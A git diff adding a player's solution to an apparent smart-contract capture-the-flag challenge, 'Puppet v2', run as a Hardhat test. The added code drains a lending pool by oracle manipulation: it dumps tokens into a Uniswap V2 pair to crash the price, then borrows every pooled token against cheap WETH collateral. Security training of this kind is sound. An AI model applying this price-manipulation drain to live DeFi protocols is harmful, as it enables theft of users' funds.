@@ -5,6 +5,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const helpers = require("@nomicfoundation/hardhat-network-helpers");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, player;
@@ -83,10 +84,55 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        amountIn = PLAYER_INITIAL_TOKEN_BALANCE;
+        await token.connect(player).approve(uniswapRouter.address, amountIn);
+        let time = await helpers.time.latest();
+        await uniswapRouter
+            .connect(player)
+            .swapExactTokensForETH(
+                amountIn,
+                1,
+                [token.address, weth.address],
+                player.address,
+                time + 5000
+            );
+        let bal, reserveA, reserveB;
+        reserveA = await token.balanceOf(uniswapExchange.address);
+        console.log(
+            "Exchange Token balance",
+            ethers.utils.formatEther(reserveA.toString())
+        );
+        reserveB = await weth.balanceOf(uniswapExchange.address);
+        console.log(
+            "Exchange Eth balance",
+            ethers.utils.formatEther(reserveB.toString())
+        );
+        bal = await ethers.provider.getBalance(player.address);
+        console.log("Player Eth balance", ethers.utils.formatEther(bal.toString()));
+        amountIn = await lendingPool.calculateDepositOfWETHRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+        console.log(
+            "Amount required to drain the pool",
+            ethers.utils.formatEther(amountIn.toString())
+        );
+        await weth
+            .connect(player)
+            .deposit({ value: ethers.utils.parseEther("29.5") });
+        await weth
+            .connect(player)
+            .approve(lendingPool.address, ethers.utils.parseEther("29.5"));
+
+        // borrow will call transferFrom, so we need the above line to approve the transfer
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
+        // TODO, rewrite with one contract
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+        //TODO(chab) make it to one
+        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(5);
+
         // Player has taken all tokens from the pool        
         expect(
             await token.balanceOf(lendingPool.address)
